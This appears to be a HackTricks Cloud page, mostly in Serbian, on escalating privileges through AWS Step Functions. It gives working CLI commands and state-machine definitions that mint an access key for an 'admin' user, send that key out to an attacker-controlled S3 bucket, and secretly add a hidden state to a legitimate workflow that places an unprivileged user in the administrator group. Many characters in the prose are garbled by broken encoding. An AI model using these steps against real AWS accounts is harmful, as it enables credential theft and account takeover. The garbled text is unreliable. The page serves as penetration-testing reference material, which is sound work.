# AWS - Step Functions Privesc

{% hint style="success" %}
U캜ite i ve쬭ajte AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
U캜ite i ve쬭ajte GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Step Functions

Za vi코e informacija o ovoj AWS usluzi, proverite:

{% content-ref url="../aws-services/aws-stepfunctions-enum.md" %}
[aws-stepfunctions-enum.md](../aws-services/aws-stepfunctions-enum.md)
{% endcontent-ref %}

### Task Resources

Ove tehnike eskalacije privilegija 캖e zahtevati kori코캖enje nekih AWS step function resursa kako bi se izvr코ile 쬰ljene akcije eskalacije privilegija.

Da biste proverili sve mogu캖e akcije, mo쬰te oti캖i na svoj AWS nalog, izabrati akciju koju 쬰lite da koristite i videti parametre koje koristi, kao u:

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-5920521132757336440-y.jpg" alt=""><figcaption></figcaption></figure>

Ili mo쬰te oti캖i na API AWS dokumentaciju i proveriti dokumentaciju za svaku akciju:

* [**AddUserToGroup**](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_AddUserToGroup.html)
* [**GetSecretValue**](https://docs.aws.amazon.com/secretsmanager/latest/apireference/API\_GetSecretValue.html)

### `states:TestState` & `iam:PassRole`

Napada캜 sa **`states:TestState`** & **`iam:PassRole`** dozvolama mo쬰 testirati bilo koju dr쬬vu i proslediti bilo koju IAM ulogu bez kreiranja ili a쬿riranja postoje캖e ma코ine stanja, omogu캖avaju캖i neovla코캖en pristup drugim AWS uslugama sa dozvolama uloga. U kombinaciji, ove dozvole mogu dovesti do opse쬹ih neovla코캖enih akcija, od manipulacije radnim tokovima do izmene podataka, do curenja podataka, manipulacije resursima i eskalacije privilegija.

{% code overflow="wrap" %}
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
{% endcode %}

Slede캖i primeri pokazuju kako testirati stanje koje kreira pristupni klju캜 za **`admin`** korisnika koriste캖i ove dozvole i permisivnu ulogu AWS okru쬰nja. Ova permisivna uloga bi trebala imati bilo koju visoko privilegovanu politiku povezanu sa njom (na primer **`arn:aws:iam::aws:policy/AdministratorAccess`**) koja omogu캖ava stanju da izvr코i akciju **`iam:CreateAccessKey`**:

* **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
* **Komanda** izvr코ena za izvo캠enje privesc:

{% code overflow="wrap" %}
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
{% endcode %}

**Potencijalni uticaj**: Neovla코캖ena izvr코enja i manipulacija radnim tokovima i pristup osetljivim resursima, 코to mo쬰 dovesti do zna캜ajnih bezbednosnih propusta.

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

Napada캜 sa **`states:CreateStateMachine`** & **`iam:PassRole`** bi mogao da kreira ma코inu stanja i dodeli joj bilo koju IAM ulogu, omogu캖avaju캖i neovla코캖en pristup drugim AWS uslugama sa dozvolama te uloge. U pore캠enju sa prethodnom tehnikom privesc (**`states:TestState`** & **`iam:PassRole`**), ova ne izvr코ava sama po sebi, tako da 캖e vam tako캠e biti potrebne dozvole **`states:StartExecution`** ili **`states:StartSyncExecution`** (**`states:StartSyncExecution`** **nije dostupna za standardne radne tokove**, **samo za izra쬰ne ma코ine stanja**) kako biste zapo캜eli izvr코enje nad ma코inom stanja.

{% code overflow="wrap" %}
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]

# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]

# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
{% endcode %}

Slede캖i primeri pokazuju kako da se kreira ma코ina stanja koja kreira pristupni klju캜 za korisnika **`admin`** i eksfiltrira ovaj pristupni klju캜 u S3 bucket pod kontrolom napada캜a, koriste캖i ove dozvole i permisivnu ulogu AWS okru쬰nja. Ova permisivna uloga bi trebala imati bilo koju politiku sa visokim privilegijama povezanu sa njom (na primer **`arn:aws:iam::aws:policy/AdministratorAccess`**) koja omogu캖ava ma코ini stanja da izvr코i akcije **`iam:CreateAccessKey`** i **`s3:putObject`**.

* **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
* **Komanda** izvr코ena za **kreiranje ma코ine stanja**:

{% code overflow="wrap" %}
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
{% endcode %}

* **Komanda** izvr코ena za **pokretanje izvr코enja** prethodno kreirane ma코ine stanja:

{% code overflow="wrap" %}
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
{% endcode %}

{% hint style="warning" %}
Napada캜em kontrolisani S3 bucket treba da ima dozvole da prihvati s3:PutObject akciju iz naloga rtve.
{% endhint %}

**Potencijalni uticaj**: Neovla코캖ena izvr코enja i manipulacija radnim tokovima i pristup osetljivim resursima, 코to mo쬰 dovesti do zna캜ajnih bezbednosnih propusta.

### `states:UpdateStateMachine` & (ne uvek neophodno) `iam:PassRole`

Napada캜 sa **`states:UpdateStateMachine`** dozvolom bi mogao da izmeni definiciju ma코ine stanja, dodaju캖i dodatne stealth stanja koja bi mogla dovesti do eskalacije privilegija. Na ovaj na캜in, kada legitimni korisnik pokrene izvr코enje ma코ine stanja, ovo novo zlo캖udno stealth stanje 캖e biti izvr코eno i eskalacija privilegija 캖e biti uspe코na.

U zavisnosti od toga koliko je IAM uloga povezana sa ma코inom stanja permisivna, napada캜 bi se suo캜io sa 2 situacije:

1. **Permisivna IAM uloga**: Ako je IAM uloga povezana sa ma코inom stanja ve캖 permisivna (ima, na primer, **`arn:aws:iam::aws:policy/AdministratorAccess`** politiku prika캜enu), tada **`iam:PassRole`** dozvola ne bi bila potrebna za eskalaciju privilegija, po코to ne bi bilo neophodno tako캠e a쬿rirati IAM ulogu, sa definicijom ma코ine stanja je dovoljno.
2. **Nepremisivna IAM uloga**: U suprotnosti sa prethodnim slu캜ajem, ovde bi napada캜 tako캠e zahtevao **`iam:PassRole`** dozvolu po코to bi bilo neophodno povezati permisivnu IAM ulogu sa ma코inom stanja pored izmene definicije ma코ine stanja.

{% code overflow="wrap" %}
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
{% endcode %}

Slede캖i primeri pokazuju kako a쬿rirati legitimnu ma코inu stanja koja samo poziva HelloWorld Lambda funkciju, kako bi se dodalo dodatno stanje koje dodaje korisnika **`unprivilegedUser`** u **`administrator`** IAM grupu. Na ovaj na캜in, kada legitimni korisnik pokrene izvr코enje a쬿rirane ma코ine stanja, ovo novo zlonamerno skriveno stanje 캖e biti izvr코eno i eskalacija privilegija 캖e biti uspe코na.

{% hint style="warning" %}
Ako ma코ina stanja nema povezanu permisivnu IAM ulogu, tako캠e 캖e biti potrebna dozvola **`iam:PassRole`** da bi se a쬿rirala IAM uloga kako bi se povezala permisivna IAM uloga (na primer, ona sa **`arn:aws:iam::aws:policy/AdministratorAccess`** politikom prilo쬰nom).
{% endhint %}

{% tabs %}
{% tab title="Legitimna ma코ina stanja" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% tab title="Zlonamerna a쬿rirana ma코ina stanja" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}
{% endtabs %}

* **Komanda** izvr코ena za **a쬿riranje** **legitimne ma코ine stanja**:

{% code overflow="wrap" %}
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
{% endcode %}

**Potencijalni uticaj**: Neovla코캖ena izvr코enja i manipulacija radnim tokovima i pristup osetljivim resursima, 코to mo쬰 dovesti do zna캜ajnih bezbednosnih propusta.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
